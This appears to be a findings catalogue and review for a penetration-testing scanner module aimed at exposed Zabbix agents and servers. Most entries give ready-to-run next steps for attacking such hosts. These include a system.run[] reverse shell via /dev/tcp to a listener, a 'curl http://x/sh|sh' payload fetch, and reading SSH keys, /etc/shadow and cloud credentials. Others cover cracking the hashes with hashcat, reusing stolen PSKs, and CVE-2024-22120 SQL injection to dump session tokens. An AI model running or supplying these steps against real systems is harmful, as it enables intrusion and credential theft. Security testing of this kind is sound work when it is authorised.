summary: Strong dual-role probe. Agent side reaches T2 (item queries actually return inventory + file contents, and system.run[] is a real RCE proof with a marker — gated behind exploit=True). Trapper side is mostly T0/T1 with an active auto-registration probe that is T2 when exploit=True (creates an attacker-chosen host — a documented CVE-2024-22120 precondition). Missing: no attempt at the SQLi payload itself, no PSK cracking helper, no active_checks token-abuse for existing autoreg actions. RCE finding folds run_as output but does not chain to a session or credential capture.

findings.title_pattern: Zabbix agent responds to arbitrary source IPs (Server= allow-list missing)
findings.tier_evidence: Agent answered agent.version from the scanner IP — deterministic proof Server= admits this source.
findings.promotion_notes: Precondition finding; downstream findings (inventory/file-read/RCE) already carry the exploitation depth.
findings.tester_next_step: zabbix_get -s <ip> -p 10050 -k agent.version — confirm; then walk the inventory/file-read/RCE probes below.

findings.title_pattern: Zabbix agent discloses host inventory unauthenticated
findings.tier_evidence: Actual item values returned (uname, hostname, listener list) — real data extraction beyond a safe presence check.
findings.promotion_notes: T3 = fold hostname/FQDN into known_hostnames and listener ports into relay_targets to drive follow-on service scans (pivot signal for firewalled internal ports).
findings.tester_next_step: for k in system.hostname system.uname net.tcp.listen system.users.num; do zabbix_get -s <ip> -p 10050 -k $k; done — parse net.tcp.listen JSON for internal-only ports.

findings.title_pattern: Zabbix agent allows arbitrary file read via vfs.file.contents
findings.tier_evidence: vfs.file.contents[/etc/passwd|/etc/shadow|conf] returned real file bodies — arbitrary read proven.
findings.promotion_notes: T3 = pull /root/.ssh/id_rsa, /root/.ssh/authorized_keys, /var/lib/zabbix/enrollment.psk, /home/*/.aws/credentials — turn read into creds/keys. Extract /etc/shadow hashes into hashcat -m 1800.
findings.tester_next_step: zabbix_get -s <ip> -p 10050 -k 'vfs.file.contents[/root/.ssh/id_rsa]'; -k 'vfs.file.contents[/etc/shadow]'; feed hashes to hashcat -m 1800 rockyou.txt.

findings.title_pattern: Zabbix agent EnableRemoteCommands=1 — pre-auth RCE via system.run[]
findings.tier_evidence: system.run[echo <marker>] echoed the marker verbatim + system.run[id] captured — controlled payload with proof of exec (not full session).
findings.promotion_notes: T3 = drop a reverse shell (zabbix agent user or root); one system.run[curl http://x/sh|sh] is a full session. Documented as tester_next_step, not automated per user directive.
findings.tester_next_step: zabbix_get -s <ip> -p 10050 -k 'system.run[bash -i >& /dev/tcp/<listener>/4444 0>&1]' — with `nc -lnvp 4444` waiting. Also fetch ~/.ssh/id_rsa and /root/.ssh/authorized_keys via system.run[cat] once as root.

findings.title_pattern: Zabbix agent leaks Server=/ServerActive= — internal monitoring topology disclosed
findings.tier_evidence: Parses Server=/ServerActive= from returned conf file — deterministic.
findings.promotion_notes: T3 = pivot from a compromised agent to the disclosed server IP (which trusts outbound to 10051), send sender/auto-reg traffic to enumerate other hosts the same server monitors. Wire into relay_targets.
findings.tester_next_step: For each Server= IP: probe 10051 with 'active checks' request; if TLS off, this is where autoreg abuse lands the widest blast radius.
python3 -c "..." (per module runbook) → confirm role=server vs proxy.

findings.title_pattern: Zabbix trapper enforces TLS PSK / certificate
findings.tier_evidence: Negative finding — trapper refused plaintext; no attack surface here.
findings.promotion_notes: Nothing to promote — the port is gated.
findings.tester_next_step: If PSK is used, look for enrollment.psk on any compromised agent (vfs.file.contents[/var/lib/zabbix/enrollment.psk]) — reuse to authenticate as that agent.

findings.title_pattern: Zabbix server/proxy accepts unauthenticated auto-registration (TLS PSK/cert off)
findings.tier_evidence: Attacker-chosen host + host_metadata request returned response=success — real create succeeded, controlled payload landed (gated by exploit=True).
findings.promotion_notes: T3 = CVE-2024-22120 SQLi via host_metadata field into the auto-registration audit log; produces DB read/write on the Zabbix server database. Destructive/detected; needs a proper polyglot payload.
findings.tester_next_step: Send active-checks with host_metadata containing the CVE-2024-22120 SQLi payload (see zabbix-2024-22120 PoC gist); confirm DB write via a benign UPDATE on auditlog. Then dump users table for zabbix session tokens / password hashes.

findings.title_pattern: Zabbix agent/server communication is plaintext (no TLS PSK/cert)
findings.tier_evidence: Accepted an unencrypted ZBXD frame — deterministic.
findings.promotion_notes: T3 = on-path capture of item values, file contents, PSKs pre-shared out-of-band. Requires L2.
findings.tester_next_step: tcpdump -i any -w zbx.pcap 'tcp port 10050 or tcp port 10051'; inspect ZBXD payloads for command output/file bodies.
